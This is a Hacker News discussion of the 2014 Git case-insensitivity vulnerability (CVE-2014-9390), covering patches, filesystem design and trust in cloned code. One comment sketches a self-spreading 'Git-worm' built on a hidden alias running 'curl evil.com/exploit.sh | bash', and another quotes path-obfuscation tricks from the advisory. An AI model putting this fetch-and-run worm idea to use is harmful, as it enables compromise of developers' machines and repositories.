[root](#8770756) | [parent](#8771273) | [next](#8771854) [–]  He even mentioned the security aspect here: [http://article.gmane.org/gmane.comp.version-control.git/7076...](http://article.gmane.org/gmane.comp.version-control.git/70760) "Having programs that get different results back from what they actually wrote, *that* tends to be a security issue" | | --- | --- | --- | | | |  |  | [Someone](user?id=Someone) [on Dec 19, 2014](item?id=8771854)   | [parent](#8770756) | [prev](#8771273) | [next](#8771767) [–]  I think the main argument against case-insensitivity is that every file system driver must contain a large [1] code blob that does the case-insensitive comparison. That blob cannot be shared between drives or with the OS because one must guarantee that it stays the same forever. It is almost a sure bet that case-insensitivity in NTFS is different from that in HFS+ (even disregarding their different canonicalization). Directory-traversal attacks work just as well with ASCII or byte sequences. [1] of course, what is large becomes less and less important over time, thanks to Moore's law. On embedded devices, this still may be quite significant, though. | | --- | --- | --- | | | |  |  | [rimantas](user?id=rimantas) [on Dec 19, 2014](item?id=8771767)   | [parent](#8770756) | [prev](#8771854) | [next](#8771446) [–]  I once tried to install OS X with case sensative filesystem. Turns out Photoshop for OS X does not work in that case. Had to go back to case-insensitive. Not sure how many other apps have the same issue. | | --- | --- | --- | | | |  |  | [kdeldycke](user?id=kdeldycke) [on Dec 19, 2014](item?id=8772172)   | [root](#8770756) | [parent](#8771767) | [next](#8771915) [–]  Also had issues with steam. The solution ? Install it in a disk image: [https://github.com/kdeldycke/dotfiles/commit/05cef3c1de4a208...](https://github.com/kdeldycke/dotfiles/commit/05cef3c1de4a208ce1d16043cd1411e5ccf6beb5) | | --- | --- | --- | | | |  |  | [wereHamster](user?id=wereHamster) [on Dec 19, 2014](item?id=8771915)   | [root](#8770756) | [parent](#8771767) | [prev](#8772172) | [next](#8771446) [–]  World of Warcraft (and any other Blizzard game) won't run off of a case sensitive filesystem. | | --- | --- | --- | | | |  |  | [ydant](user?id=ydant) [on Dec 19, 2014](item?id=8772395)   | [root](#8770756) | [parent](#8771915) | [next](#8771446) [–]  Steam also requires case-insensitive filesystem on OSX. | | --- | --- | --- | | | |  |  | [hereonbusiness](user?id=hereonbusiness) [on Dec 19, 2014](item?id=8772566)   | [root](#8770756) | [parent](#8772395) | [next](#8771446) [–]  Steam on Linux does not. That probably means that Linux doesn't get any steam games that require a case-insensitive fs even if they would work otherwise (unity3d, monogame, ...), at least if there isn't a special linux version that does not require it. I never really thought about this issue. | | --- | --- | --- | | | |  |  | [hjnilsson](user?id=hjnilsson) [on Dec 19, 2014](item?id=8771446)   | [parent](#8770756) | [prev](#8771767) | [next](#8771927) [–]  The issue here is not case-insensitive filesystems, they are a huge benefit to novice users. But that the type system does not distinguish between paths and strings. A path is distinctly different from a string, and should never be compared as one. The type system should always enforce this and never allow you to mistakingly do the comparison you propose, for exactly the reasons you state. Modern filesystem libraries (for type-safe languages) do this, the problem is (as is becoming more and more common lately) the abundance of old tools that were not designed with security in mind. | | --- | --- | --- | | | |  |  | [couchand](user?id=couchand) [on Dec 19, 2014](item?id=8772398)   | [root](#8770756) | [parent](#8771446) | [next](#8772037) [–]  As you point out, a path is different from a string. It makes sense in many cases to do a case-insensitive comparison on strings. It NEVER makes sense to do that on paths. A path is an identifier. Just as it's infuriating and horrendous to have programming language identifiers act case-insensitively, it's a poor design choice to have path identifiers act case-insensitively. I suspect that what you describe as *a huge benefit to novice users* is entirely seen in search functionality, where you are comparing a string (the search needle) against a number of paths (the haystack). Since this search should be conducted by converting the path to a string (never the other way around, that's nonsensical) it's perfectly natural to support CI operations on strings but forbid them on paths. | | --- | --- | --- | | | |  |  | [spdegabrielle](user?id=spdegabrielle) [on Dec 19, 2014](item?id=8772037)   | [root](#8770756) | [parent](#8771446) | [prev](#8772398) | [next](#8771927) [–]  so true | | --- | --- | --- | | | |  |  | [archagon](user?id=archagon) [on Dec 19, 2014](item?id=8771927)   | [parent](#8770756) | [prev](#8771446) | [next](#8769755) [–]  The OS should always be in service of the user. And users (in my experience) vastly prefer case insensitivity. Sorry, but there's just no way around it. | | --- | --- | --- | | | |  |  | [oneeyedpigeon](user?id=oneeyedpigeon) [on Dec 19, 2014](item?id=8772247)   | [root](#8770756) | [parent](#8771927) | [next](#8772004) [–]  Can you elaborate on that experience? I would have thought users not typing filenames wouldn't care less, and that users who are typing filenames would tend to be developers or 'advanced' users who aren't confused by case-sensitivity, and recognise the advantages. | | --- | --- | --- | | | |  |  | [userbinator](user?id=userbinator) [on Dec 19, 2014](item?id=8772339)   | [root](#8770756) | [parent](#8772247) | [next](#8772004) [–]  That's how I see it too - inexperienced users will only be typing in filenames to name new files and likely use a GUI filechooser for selecting existing ones, while the ones typing in filenames are probably using CLIs. The common complaint "but it's annoying to have to type in the filenames *exactly*" can be solved with tab-completion (I'm surprised how many CLI users don't know their shell has this feature), and using sane naming conventions like not GiVinG yOuR fIleS\_stUpiD-NaMESLikEth1s. | | --- | --- | --- | | | |  |  | [spdegabrielle](user?id=spdegabrielle) [on Dec 19, 2014](item?id=8772004)   | [root](#8770756) | [parent](#8771927) | [prev](#8772247) | [next](#8769755) [–]  Users shouldn't have access to the filesystem. The usability issues are too significant even for competent users. A good laugh/example: <http://xkcd.com/1459/> | | --- | --- | --- | | | |  |  | [npizzolato](user?id=npizzolato) [on Dec 20, 2014](item?id=8776938)   | [root](#8770756) | [parent](#8772004) | [next](#8769755) [–]  The length at which I have to go to remember how to get stuff onto an ipad through itunes is an exercise that always reminds me that I *always* want access to the filesystem, even if I don't normally use it. | | --- | --- | --- | | | |  |  | [necubi](user?id=necubi) [on Dec 18, 2014](item?id=8769755)   | [prev](#8770756) | [next](#8769975) [–]  Homebrew just updated (<https://github.com/Homebrew/homebrew/pull/35105>), so Homebrew users should be covered by ```     brew update && brew upgrade git ``` | | --- | --- | --- | | | |  |  | [tlrobinson](user?id=tlrobinson) [on Dec 18, 2014](item?id=8769966)   | [parent](#8769755) | [next](#8769769) [–]  Ironically, Homebrew uses git to update its package metadata, but presumably you already trust Homebrew to not deliver malicious software (I also don't know if "pull" is vulnerable, or just "clone" and "checkout". Also Homebrew is hosted on Github, which now scans/blocks malicious repos) | | --- | --- | --- | | | |  |  | [raverbashing](user?id=raverbashing) [on Dec 19, 2014](item?id=8771652)   | [root](#8769755) | [parent](#8769966) | [next](#8770838) [–]  > I also don't know if "pull" is vulnerable, or just "clone" and "checkout Yes it is Now if you just do fetch and don't merge/rebase you're safe, still, this is a very rare occurence | | --- | --- | --- | | | |  |  | [lugg](user?id=lugg) [on Dec 19, 2014](item?id=8770838)   | [root](#8769755) | [parent](#8769966) | [prev](#8771652) | [next](#8769769) [–]  Further ironically how many people just did a ```     brew update && brew upgrade  ``` Without the git part specifically. | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on Dec 18, 2014](item?id=8769769)   | [parent](#8769755) | [prev](#8769966) | [next](#8770230) [–]  Make sure you're not using Apple Git (/usr/bin/git); I renamed mine. | | --- | --- | --- | | | |  |  | [cpach](user?id=cpach) [on Dec 18, 2014](item?id=8770247)   | [root](#8769755) | [parent](#8769769) | [next](#8770510) [–]  Gah. Incidents like this makes me frustrated OS X doesn’t have a solid package manager like APT. | | --- | --- | --- | | | |  |  | [saidajigumi](user?id=saidajigumi) [on Dec 18, 2014](item?id=8770393)   | [root](#8769755) | [parent](#8770247) | [next](#8771035) [–]  Is package management really at issue here? For Apple supplied software, I think it really boils down to the same thing as other distros/OSes: timeliness of security updates. If Apple isn't able to spin out incremental security updates as quickly as other distributions, I'd say that process issue is the real problem. Honestly, there's also something to be said for two-tier package management, ala OS X with Homebrew. Self-contained third party apps get a more managable space of base system profiles to target, and the installation UX can be as simple as drag/drop/app works. Us "special needs" users can then layer on and manage more esoteric and/or cutting-edge tools as needed with a full package manager. Heck, I was really glad to see Linuxbrew finally come to fruition for this very same reason. Have your cake and roll a newer-than-distro version of your tools too! | | --- | --- | --- | | | |  |  | [lugg](user?id=lugg) [on Dec 19, 2014](item?id=8770870)   | [root](#8769755) | [parent](#8770393) | [next](#8771035) [–]  >Honestly, there's also something to be said for two-tier package management, ala OS X with Homebrew Agreed, I really like the sound of that. Been aching for some time to have a stable base system like deb stable / slackware and then have my development toolchain specifically but other uses might surface / need bleeding edge. | | --- | --- | --- | | | |  |  | [tillinghast](user?id=tillinghast) [on Dec 19, 2014](item?id=8771035)   | [root](#8769755) | [parent](#8770247) | [prev](#8770393) | [next](#8770510) [–]  Homebrew (<http://brew.sh>) is pretty darned solid. | | --- | --- | --- | | | |  |  | [cdjk](user?id=cdjk) [on Dec 19, 2014](item?id=8770510)   | [root](#8769755) | [parent](#8769769) | [prev](#8770247) | [next](#8770230) [–]  I tend to put /usr/local/bin ahead of /usr/bin on my $PATH, which nicely solves that problem. | | --- | --- | --- | | | |  |  | [basicallydan](user?id=basicallydan) [on Dec 19, 2014](item?id=8771560)   | [root](#8769755) | [parent](#8770510) | [next](#8770230) [–]  It should do, but if an application wants to use /usr/bin/git for some reason they can still just do that! | | --- | --- | --- | | | |  |  | [aleyan](user?id=aleyan) [on Dec 18, 2014](item?id=8770230)   | [parent](#8769755) | [prev](#8769769) | [next](#8769798) [–]  For those of us using macports, the port file was updated an hour ago: [https://trac.macports.org/browser/trunk/dports/devel/git/Por...](https://trac.macports.org/browser/trunk/dports/devel/git/Portfile) ```     sudo port selfupdate     sudo port upgrade git      git --version ``` | | --- | --- | --- | | | |  |  | [tomp](user?id=tomp) [on Dec 18, 2014](item?id=8769798)   | [parent](#8769755) | [prev](#8770230) | [next](#8769885) [–]  And don't copy&paste the above code into the terminal! (Potential vulnerability, though HN is probably safe.) | | --- | --- | --- | | | |  |  | [sysk](user?id=sysk) [on Dec 19, 2014](item?id=8770805)   | [root](#8769755) | [parent](#8769798) | [next](#8769885) [–]  What is the potential vulnerability? | | --- | --- | --- | | | |  |  | [jokamoto](user?id=jokamoto) [on Dec 19, 2014](item?id=8770842)   | [root](#8769755) | [parent](#8770805) | [next](#8769885) [–]  It's possible to use invisible characters to hide malicious commands during copy-paste[1]. [1]: <https://news.ycombinator.com/item?id=5508225> | | --- | --- | --- | | | |  |  | [simi\_](user?id=simi_) [on Dec 18, 2014](item?id=8769885)   | [parent](#8769755) | [prev](#8769798) | [next](#8771958) [–]  I keep getting ```     fatal: unable to access 'https://github.com/Homebrew/homebrew/': The requested URL returned error: 503     Error: Failure while executing: git pull -q origin refs/heads/master:refs/remotes/origin/master  ``` Weird, it's the first time it's ever happened. edit: wait, it worked after a couple of tries; maybe it's due to panicked people updating brew\git? | | --- | --- | --- | | | |  |  | [andruby](user?id=andruby) [on Dec 18, 2014](item?id=8769983)   | [root](#8769755) | [parent](#8769885) | [next](#8771958) [–]  This might be an issue with github due to load or their security fixes or code scans. I've been able to run `brew update && brew upgrade git`. | | --- | --- | --- | | | |  |  | [lucaspiller](user?id=lucaspiller) [on Dec 19, 2014](item?id=8771958)   | [parent](#8769755) | [prev](#8769885) | [next](#8769886) [–]  Bear in mind if you use GitHub for Mac it includes it's own version of Git too. The latest version "Honourary Brit (194)" includes a patch for this fix. | | --- | --- | --- | | | |  |  | [IgorPartola](user?id=IgorPartola) [on Dec 18, 2014](item?id=8769886)   | [parent](#8769755) | [prev](#8771958) | [next](#8769975) [–]  brew update will use `git clone`, so yeah... | | --- | --- | --- | | | |  |  | [brandonbloom](user?id=brandonbloom) [on Dec 18, 2014](item?id=8769920)   | [root](#8769755) | [parent](#8769886) | [next](#8769943) [–]  Presumably you already trust homebrew to run arbitrary code on your machine. | | --- | --- | --- | | | |  |  | [markcerqueira](user?id=markcerqueira) [on Dec 18, 2014](item?id=8769943)   | [root](#8769755) | [parent](#8769886) | [prev](#8769920) | [next](#8769940) [–]  You better walk over to the Homebrew office and get the update on a USB stick then, Mr. Safety! | | --- | --- | --- | | | |  |  | [necubi](user?id=necubi) [on Dec 18, 2014](item?id=8769940)   | [root](#8769755) | [parent](#8769886) | [prev](#8769943) | [next](#8769926) [–]  If you read the blog post, GitHub has checked all their repos for for this exploit and is blocking it on pushes; cloning from GitHub *should* be safe. | | --- | --- | --- | | | |  |  | [IgorPartola](user?id=IgorPartola) [on Dec 19, 2014](item?id=8770440)   | [root](#8769755) | [parent](#8769940) | [next](#8769926) [–]  The blocking pushes is what I was concerned with, along with brew searching pull requests. | | --- | --- | --- | | | |  |  | [apetresc](user?id=apetresc) [on Dec 18, 2014](item?id=8769926)   | [root](#8769755) | [parent](#8769886) | [prev](#8769940) | [next](#8769975) [–]  I'm fairly confident Homebrew isn't exploiting this | | --- | --- | --- | | | |  |  | [jazzychad](user?id=jazzychad) [on Dec 18, 2014](item?id=8769975)   | [prev](#8769755) | [next](#8769736) [–]  If you don't want to use homebrew on mac, here is the list of commands I used to upgrade: <https://gist.github.com/jazzychad/07c0c6da5709202e8106> | | --- | --- | --- | | | |  |  | [numlocked](user?id=numlocked) [on Dec 18, 2014](item?id=8770079)   | [parent](#8769975) | [next](#8770168) [–]  This was very helpful and clearly documented. Thanks! Also, your github profile picture is amazing. | | --- | --- | --- | | | |  |  | [unspecified](user?id=unspecified) [on Dec 18, 2014](item?id=8770168)   | [parent](#8769975) | [prev](#8770079) | [next](#8770423) [–]  Thanks for this. Might want to move the original /usr/bin/git out of the way, rather than outright deleting it, juuuuust in case you end up needing the original binary. | | --- | --- | --- | | | |  |  | [jazzychad](user?id=jazzychad) [on Dec 18, 2014](item?id=8770291)   | [root](#8769975) | [parent](#8770168) | [next](#8770423) [–]  /usr/bin/git is usually a soft symlink, so the original binary is still there when you rm the synlink. You can see the actual location by doing ```     ls -al /usr/bin/git  ``` If it's not in fact a symlink then yes you should probably rename it to preserve it. | | --- | --- | --- | | | |  |  | [Demiurge](user?id=Demiurge) [on Dec 19, 2014](item?id=8771309)   | [root](#8769975) | [parent](#8770291) | [next](#8770423) [–]  Yosemite, mine is not | | --- | --- | --- | | | |  |  | [marquis](user?id=marquis) [on Dec 19, 2014](item?id=8770423)   | [parent](#8769975) | [prev](#8770168) | [next](#8770144) [–]  Thanks - really appreciate the signature checking phase. To make sure I had a working git in case all went wrong I added: sudo mv /usr/bin/git /usr/bin/git2 before the symlink. | | --- | --- | --- | | | |  |  | [iamdave](user?id=iamdave) [on Dec 18, 2014](item?id=8770144)   | [parent](#8769975) | [prev](#8770423) | [next](#8770246) [–]  Beautiful, cheers for this! | | --- | --- | --- | | | |  |  | [hwang89](user?id=hwang89) [on Dec 18, 2014](item?id=8770246)   | [parent](#8769975) | [prev](#8770144) | [next](#8771013) [–]  Worked for me. | | --- | --- | --- | | | |  |  | [fnayr](user?id=fnayr) [on Dec 19, 2014](item?id=8771013)   | [parent](#8769975) | [prev](#8770246) | [next](#8769736) [–]  Thanks! | | --- | --- | --- | | | |  |  | [califield](user?id=califield) [on Dec 18, 2014](item?id=8769736)   | [prev](#8769975) | [next](#8769807) [–]  I was wondering who found this vulnerability. You have to click through to the Git mailing list announcement[1]: > A big "thanks!" for bringing this issue to us goes to our friends in the Mercurial land, namely, Matt Mackall and Augie Fackler. It'd be interesting to hear how they came across this. Matt is the leader of the Mercurial project and Augie is a Mercurial core contributor. This doesn't seem like a high priority upgrade since GitHub now blocks the vulnerability from being pushed to their servers. [1] <http://article.gmane.org/gmane.linux.kernel/1853266> edit: Upgrade ASAP! | | --- | --- | --- | | | |  |  | [tptacek](user?id=tptacek) [on Dec 18, 2014](item?id=8769751)   | [parent](#8769736) | [next](#8769746) [–]  It's a very high priority, because there are things that transparently use Git and don't host all their repositories on Github. Update ASAP. | | --- | --- | --- | | | |  |  | [jzwinck](user?id=jzwinck) [on Dec 19, 2014](item?id=8770502)   | [root](#8769736) | [parent](#8769751) | [next](#8770385) [–]  Things which transparently use Git on Windows seem likely to bundle their own copy of Git in their installer. I don't know of specific examples, but if this happens it may be trickier for average people to stay safe. Worse, I don't know how to generate a list of such programs. | | --- | --- | --- | | | |  |  | [jackmaney](user?id=jackmaney) [on Dec 18, 2014](item?id=8770385)   | [root](#8769736) | [parent](#8769751) | [prev](#8770502) | [next](#8769787) [–]  Yes. This. I work in a fairly Enterprisey company that uses git as their VCS. I'm just hoping that IT is relatively calm about this and just pushes out updates/nags people about upgrading their git client. | | --- | --- | --- | | | |  |  | [califield](user?id=califield) [on Dec 18, 2014](item?id=8769787)   | [root](#8769736) | [parent](#8769751) | [prev](#8770385) | [next](#8769746) [–]  Yeah, but typically you have a certain level of trust in your project dependencies. Adding a library to your project often means granting access to your system anyway (if the dependency contains executable code). | | --- | --- | --- | | | |  |  | [peff](user?id=peff) [on Dec 18, 2014](item?id=8769823)   | [root](#8769736) | [parent](#8769787) | [next](#8769971) [–]  You were and are vulnerable to malicious projects by running: ```     git clone git://...     make  ``` or anything similar, since you are running arbitrary code out of the repository. This release fixes the problem of: ```     git clone git://...     git show  ``` etc. Git cannot fix the "clone and run" problem, which is a social one. But it should be safe to run git commands to inspect the repository contents. | | --- | --- | --- | | | |  |  | [comex](user?id=comex) [on Dec 18, 2014](item?id=8770093)   | [root](#8769736) | [parent](#8769823) | [next](#8769971) [–]  I don't think the GP should be downvoted. What you say is exactly correct - however - I can't even think of a time I've git cloned some piece of code and not proceeded to run some code from it at some point, typically on the same machine. I download code for the purpose of using it, and while I could hypothetically inspect the entire repository for malicious code, I don't think I'm unusual in not doing that on a regular basis. I guess maybe Docker/Vagrant/etc. users don't normally run code directly on their development machine, so it can be high priority for them. But as someone who doesn't use these tools (not a web developer), for me the vulnerability is extremely low priority. | | --- | --- | --- | | | |  |  | [peff](user?id=peff) [on Dec 19, 2014](item?id=8772354)   | [root](#8769736) | [parent](#8770093) | [next](#8769971) [–]  I think we are actually agreeing. I think it is important to have this Git fix, because it lets people be careful if they choose. But in practice most people are \_not\_ careful, and will happily clone and run code without inspecting it (or pipe curl to bash!). It's almost impossible to do otherwise, as there are only so many hours in the day. Ultimately I think we are mostly protected by the fact that this kind of attack is simply not all that common. And if it were done in a very widespread way, somebody would probably notice and the repo would come under scrutiny. It would probably be very effective as a directed attack against a small number of people, especially if the code you executed was sneaky (i.e., install a rootkit, not `rm -rf /`). | | --- | --- | --- | | | |  |  | [mikeash](user?id=mikeash) [on Dec 18, 2014](item?id=8769971)   | [root](#8769736) | [parent](#8769787) | [prev](#8769823) | [next](#8769829) [–]  You can at least in theory inspect the library code after cloning it but before compiling it. Insta-owning your machine just because you cloned it is considerably worse. This is especially true if you always run the library in a sandbox of some sort (e.g. you're building an Android app and your code always runs on an Android device or emulator). | | --- | --- | --- | | | |  |  | [dlubarov](user?id=dlubarov) [on Dec 19, 2014](item?id=8770555)   | [root](#8769736) | [parent](#8769971) | [next](#8769829) [–]  With Android apps you still build locally, typically with Gradle, allowing arbitrary code execution on the host. | | --- | --- | --- | | | |  |  | [mikeash](user?id=mikeash) [on Dec 19, 2014](item?id=8770810)   | [root](#8769736) | [parent](#8770555) | [next](#8769829) [–]  Oh yes, I suppose a bad build script could undo you. In the land of iOS there are sometimes "libraries" that are just distributed as source files that you add to your own project, so I suppose that at least would qualify. | | --- | --- | --- | | | |  |  | [mike\_hearn](user?id=mike_hearn) [on Dec 19, 2014](item?id=8771739)   | [root](#8769736) | [parent](#8770810) | [next](#8769829) [–]  Additionally, are you willing to bet that there are no buffer overflows in gcc, sed, awk, and whatever other tools you use to build software from git on a regular basis? Heck, some of the Google security guys have been discovering lately that you can pwn someone just by getting them to run less on a file. How many people start by doing "less README"? Git should ideally not have this vulnerability, but panicking over this seems overkill. If you want to suck down and work with large amounts of code from a possibly malicious source, you get into virtual machines territory. | | --- | --- | --- | | | |  |  | [mikeash](user?id=mikeash) [on Dec 19, 2014](item?id=8772379)   | [root](#8769736) | [parent](#8771739) | [next](#8769829) [–]  I'm sure there are such bugs, but a bug's severity doesn't decrease just because there are other bugs of similar severity elsewhere. | | --- | --- | --- | | | |  |  | [Bahamut](user?id=Bahamut) [on Dec 18, 2014](item?id=8769829)   | [root](#8769736) | [parent](#8769787) | [prev](#8769971) | [next](#8769746) [–]  All it takes is one dependency getting infected to ruin your day (or more). | | --- | --- | --- | | | |  |  | [ngoldbaum](user?id=ngoldbaum) [on Dec 18, 2014](item?id=8769746)   | [parent](#8769736) | [prev](#8769751) | [next](#8770252) [–]  The CVE affects mercurial as well according to the 3.2.3 release notes. | | --- | --- | --- | | | |  |  | [durin42](user?id=durin42) [on Dec 18, 2014](item?id=8769799)   | [root](#8769736) | [parent](#8769746) | [next](#8770252) [–]  Yes, I asked for a CVE ID for hg but the mitre folks never got back to me. | | --- | --- | --- | | | |  |  | [indygreg2](user?id=indygreg2) [on Dec 18, 2014](item?id=8770252)   | [parent](#8769736) | [prev](#8769746) | [next](#8769807) [–]  More back story: <https://twitter.com/indygreg/status/545701974671233024> | | --- | --- | --- | | | |  |  | [baldfat](user?id=baldfat) [on Dec 18, 2014](item?id=8769807)   | [prev](#8769736) | [next](#8769858) [–]  >In addition, the following updated versions of Git address this vulnerability: Not everyone has the patch. The Git core team has announced maintenance releases for all current versions of Git (v1.8.5.6, v1.9.5, v2.0.5, v2.1.4, and v2.2.1). I have one Windows machine and went to update <http://git-scm.com/download/win> (preview Version 1.9.4) It was released 3 months ago, on 2014-09-29. <https://msysgit.github.io> (Version 1.9.5 preview BUT no documentation that this is for a security fix) Doesn't seem like I can update my git client | | --- | --- | --- | | | |  |  | [akaBruce](user?id=akaBruce) [on Dec 18, 2014](item?id=8770035)   | [parent](#8769807) | [next](#8769988) [–]  For whatever it's worth, I just downloaded 1.9.5 for Windows from <https://msysgit.github.io/>. While the release notes don't mention "CVE-2014-9390" explicitly, it does say this: Changes since Git-1.9.4-preview20140929 New Features ... Bugfixes \* Safeguards against bogus file names on NTFS. Edit: Actually, there it is on their git hub releases page. [https://github.com/msysgit/msysgit/releases/tag/Git-1.9.5-pr...](https://github.com/msysgit/msysgit/releases/tag/Git-1.9.5-preview20141217) | | --- | --- | --- | | | |  |  | [taspeotis](user?id=taspeotis) [on Dec 18, 2014](item?id=8769988)   | [parent](#8769807) | [prev](#8770035) | [next](#8769858) [–]  One thing I want to know but haven't gotten around to figuring out who to ask is why msysgit is 1.x instead of 2.x? I saw some mention on their Github issue tracker that msysgit had been rebased on top of 2.x but the downloads don't seem to be updated. I figured I could build from source if I really wanted and the downloads would be updated eventually but ... they have not. | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 18, 2014](item?id=8769858)   | [prev](#8769807) | [next](#8769738) [–]  Visual Studio is affected by this; Microsoft has released patches for Visual Studio 2013, Visual Studio 2013 Update 4 and an updated Git Provider for Visual Studio 2012. Users of Visual Studio are urged to apply an update. Brian Harry's blog has more information and links to download URLs for the updates: [http://blogs.msdn.com/b/bharry/archive/2014/12/18/git-vulner...](http://blogs.msdn.com/b/bharry/archive/2014/12/18/git-vulnerability-with-git-config.aspx) | | --- | --- | --- | | | |  |  | [tlarkworthy](user?id=tlarkworthy) [on Dec 18, 2014](item?id=8769738)   | [prev](#8769858) | [next](#8769753) [–]  > We have also completed an automated scan of all existing content on github.com to look for malicious content that might have been pushed to our site before this vulnerability was discovered did they find any problems? The post doesn't say... | | --- | --- | --- | | | |  |  | [peff](user?id=peff) [on Dec 18, 2014](item?id=8769782)   | [parent](#8769738) | [next](#8769772) [–]  We found 10 repositories which would have been blocked on push with the new restrictions. None of them were found to be malicious. | | --- | --- | --- | | | |  |  | [ImJasonH](user?id=ImJasonH) [on Dec 19, 2014](item?id=8770853)   | [root](#8769738) | [parent](#8769782) | [next](#8769772) [–]  Do those 10 repos include private repos? What is GitHub's policy about scanning/inspecting private repos in cases like this? | | --- | --- | --- | | | |  |  | [ethomson](user?id=ethomson) [on Dec 18, 2014](item?id=8769772)   | [parent](#8769738) | [prev](#8769782) | [next](#8769753) [–]  Vicent Marti (from GitHub) states: "In case it's not obvious from the post: There are no malicious repos in @github and they can't be pushed anymore. Update your Git anyway." <https://twitter.com/vmg/status/545693913491984385> | | --- | --- | --- | | | |  |  | [mikeash](user?id=mikeash) [on Dec 18, 2014](item?id=8769961)   | [root](#8769738) | [parent](#8769772) | [next](#8769753) [–]  Which still doesn't say! That says there aren't any, but is silent on whether there *were* any. It's probably safe to assume that this is just clumsy wording and he meant to say that the scan found nothing, but it could also be a careful attempt at trying to sound like it says more than it really does. | | --- | --- | --- | | | |  |  | [amatix](user?id=amatix) [on Dec 18, 2014](item?id=8769753)   | [prev](#8769738) | [next](#8770543) [–]  Git-worm concept: \* create an alias which does something evil "curl evil.com/exploit.sh | bash;", maybe as a typo (commti?) since "to avoid confusion and troubles with script usage, aliases that hide existing Git commands are ignored" \* exploit code finds other local git repos and infects them (maybe avoiding those with github/bitbucket remotes, since they'll be blocked) \* be innocuous-looking via git config's "include", so the bad aliases aren't obviously visible looking at ~/.gitconfig | | --- | --- | --- | | | |  |  | [xg15](user?id=xg15) [on Dec 18, 2014](item?id=8769867)   | [parent](#8769753) | [next](#8770543) [–]  You don't even need to alias a typo - if the vulnerability allows to overwrite arbitrary files in the .git-directory, which is what it sounds like, you can just add a book that will be executed on each commit/fetch/push/etc... So yes, this is dangerous. | | --- | --- | --- | | | |  |  | [xg15](user?id=xg15) [on Dec 19, 2014](item?id=8771879)   | [root](#8769753) | [parent](#8769867) | [next](#8770543) [–]  ... hook, not book... | | --- | --- | --- | | | |  |  | [vog](user?id=vog) [on Dec 19, 2014](item?id=8770543)   | [prev](#8769753) | [next](#8769771) [–]  Ouch! And I thought the OpenBSD people were paranoid for sticking with CVS. (because Git is too bloated and complex in their view, so they weren't able to review it thoroughly, which would have been the only way for them to trust it.) I always get a strange, uneasy feeiling when the tin foil hats turn out to be right. I wonder if they are right on GPG, too. For those who don't know this: The OpenBSD people refuse to sign their releases with that "far too complex" GPG tool, but created their own lightweight "signify" tool instead. [1] [1] <http://www.tedunangst.com/flak/post/signify> | | --- | --- | --- | | | |  |  | [yourad\_io](user?id=yourad_io) [on Dec 19, 2014](item?id=8770754)   | [parent](#8770543) | [next](#8770634) [–]  Git devs made the incorrect assumption that saving .giT/cONFIg to disk, would actually save .giT/cONFIg to disk. Ridiculously enough, this is not always the case (I weep for us). Should they have known that Windows and MacOS sport case-insensitive filesystems? Definitely. But, how does this have anything to do with bloat or complexity? | | --- | --- | --- | | | |  |  | [yourad\_io](user?id=yourad_io) [on Dec 19, 2014](item?id=8770835)   | [root](#8770543) | [parent](#8770754) | [next](#8770634) [–]  And the case-sensitivity stuff is somewhat low-hanging fruit, but... ```    On Windows, certain path components that are different from ".git"    are mapped to ".git", e.g. "git~1/config" is treated as if it were    ".git/config".  HFS+ has a similar issue, where certain unicode    codepoints are ignored, e.g. ".g\u200cit/config" is treated as if    it were ".git/config"  ``` So *that's* what ridiculous means. Huh. | | --- | --- | --- | | | |  |  | [oneeyedpigeon](user?id=oneeyedpigeon) [on Dec 19, 2014](item?id=8772324)   | [root](#8770543) | [parent](#8770835) | [next](#8770634) [–]  Oh my lord. That's just Windows being vulnerable, rather than git though, right? No way every piece of Windows software protects adequately against that ... misfeature. | | --- | --- | --- | | | |  |  | [xorcist](user?id=xorcist) [on Dec 19, 2014](item?id=8773966)   | [root](#8770543) | [parent](#8772324) | [next](#8775195) [–]  There's been half a dozen path traversing exploits against MS IIS, before they finally caved in and took reasonably complete measures in IIS 6 (IIRC). | | --- | --- | --- | | | |  |  | [yourad\_io](user?id=yourad_io) [on Dec 19, 2014](item?id=8775195)   | [root](#8770543) | [parent](#8772324) | [prev](#8773966) | [next](#8770634) [–]  Nah. From a purist POV, you can sneer at this and say "Bah! Case-insensitive filesystems in 201X? I save `CAT` and that replaces `cat`? Save me, mighty failcats! Wherever else in CS do we accept such blatant approximations, instead of The One And Actual True Computational Result". And you would be mostly right (except for anything floating point). The reality check is that neither Windows nor MacOS ambushed anyone with overnight with case-insensitivity. It's been there (as the default, right?), since "forever". Git officially supports Win & Mac. Git design already protected .git/config, just not in a sufficiently effective manner (as far as 2/3ds of their major distribution platforms are concerned - yes, the defaults are what you should assume everyone has). [1] Fun estimate: A lot of technical/knowledgable MacOSX folks, especially in the Webdev/webdesign/etc industries, will have been vulnerable to this despite their personal preferences. Adobe Photoshop (and the others of the creative suite, I think) had a certain idiosyncratic behaviour[2] when certain conditions were not met[3]. You paid thousands for that broken installer/support and Richard Stallman weeps for you. [1] Aside: You think Git is getting shafted by Windows/Mac implementation idiosyncrasies in *this case*? Then you'll love the favourite issue node.js on windows: "Breaks on large projects". This is essentially a side-effect of solving the dependency hell problem effectively - by nesting dependencies under a node\_modules directory on both project and dependency levels - and insufficient intelligence to foresee that preserving path length is a viable goal in software design (in 200X, no less). Because, in sufficiently bloated projects, you can have enough nested node\_modules/$name/node\_..., that you literally blow Windows' fuse. But it's not a big deal, because that max path length is like some huge number, like 2^32 or some shit. Righ - 260 characters. 257 and C:\. Including slashes and all. So when node.js picked the completely reasonable "node\_modules" as a dependency includes dir name, they should have known better - that their project would attract a huge audience and that sufficiently complicated/bloated packages would be created and distributed that their depencency-includes-dir-name selection would become a show-stopper, because one of our favourite OSes is still eating glue in the corner. And what didn't actually work? Not node. Not npm. Windows Explorer and other tools/utils that weren't updated to support NTFS' actual maximum path size - 32K. On the one hand, node.js github issues piling up ("FIXITTT!!!!") and on the other, Microsoft says "NTFS supporting 32K path length, while Windows Explorer supporting 260 chars, is not a bug. Repeat, not a bug." [2] Didn't work at all. "It isn't a bug, it's a System Requirement." [3] Case-insensitivity in the FS. Not just as a concept, but as a pre-requisite for installing an expensive class-A consumer design application. Really think about this. You've just paid between 3 and 4 digit sums for this single license. The installer creates a bunch of files, but for securitah(?) we randomize capitalization of all paths (!) so the only way this could possibly work is if the *god damned filesystem* is cool with the app sometimes requesting 'Data', others 'data', occasiionally (during rants, mostly) 'DATA', and every April Fools day, 'dAtA', and always getting back the (proper) 'daTA'. As a developer, isn't this about as desirable as trying to save 